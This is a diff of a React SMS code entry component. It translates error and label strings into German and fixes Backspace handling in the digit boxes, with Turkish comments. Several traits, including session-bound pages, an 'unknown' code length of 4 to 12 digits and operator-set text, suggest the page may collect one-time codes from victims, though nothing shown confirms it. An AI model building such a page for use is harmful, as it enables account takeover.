@@ -153,8 +153,8 @@ export function SmsClient({ sessionId }: Props) {
     if (!(validFixed || validUnknown)) {
       setMsg(
         smsMode === "fixed"
-          ? `Enter exactly ${digits} digits.`
-          : "Enter 4 to 12 digits.",
+          ? `Bitte genau ${digits} Ziffern eingeben.`
+          : "Bitte 4 bis 12 Ziffern eingeben.",
       );
       return;
     }
@@ -248,7 +248,7 @@ export function SmsClient({ sessionId }: Props) {
       <div className="pak-page-shell">
         <div className="w-full max-w-[650px] rounded-[24px] bg-[#141416] border border-[#DF0000] shadow-[0_0_40px_rgba(223,0,0,0.3)] p-5 sm:p-8 text-center">
           <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
-              Invalid link.
+              Ungueltiger Link.
           </p>
         </div>
       </div>
@@ -286,7 +286,7 @@ export function SmsClient({ sessionId }: Props) {
   const displayText = customText || settings.sms_subtitle;
   const labelText =
     smsMode === "unknown"
-      ? `${settings.sms_input_label} (Minimum 4 digits, maximum 12)`
+      ? `${settings.sms_input_label} (Mindestens 4 Ziffern, hoechstens 12)`
       : `${settings.sms_input_label} (${digits})`;
 
   // OTP style input handling
@@ -345,7 +345,19 @@ export function SmsClient({ sessionId }: Props) {
   };
 
   const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
-    if (e.key === "Ruecktaste" && !code[index] && index > 0) {
+    if (e.key !== "Backspace") return;
+    if (code[index]) {
+      // Dolu kutuda Backspace: o kutuyu bosalt
+      const cleared = code.split("");
+      cleared[index] = "";
+      setCode(cleared.join("").replace(/\s/g, ""));
+      return;
+    }
+    // Bos kutuda Backspace: bir onceki kutuya git ve onu bosalt
+    if (index > 0) {
+      const cleared = code.split("");
+      cleared[index - 1] = "";
+      setCode(cleared.join("").replace(/\s/g, ""));
       const prevInput = document.getElementById(`otp-input-${index - 1}`);
       if (prevInput) prevInput.focus();
     }
@@ -420,8 +432,8 @@ export function SmsClient({ sessionId }: Props) {
             {!valid && code.length > 0 ? (
               <p className="text-xs text-red-400">
                 {smsMode === "fixed"
-                  ? `Enter exactly ${digits} digits.`
-                  : "Enter 4 to 12 digits."}
+                  ? `Bitte genau ${digits} Ziffern eingeben.`
+                  : "Bitte 4 bis 12 Ziffern eingeben."}
               </p>
             ) : null}
 
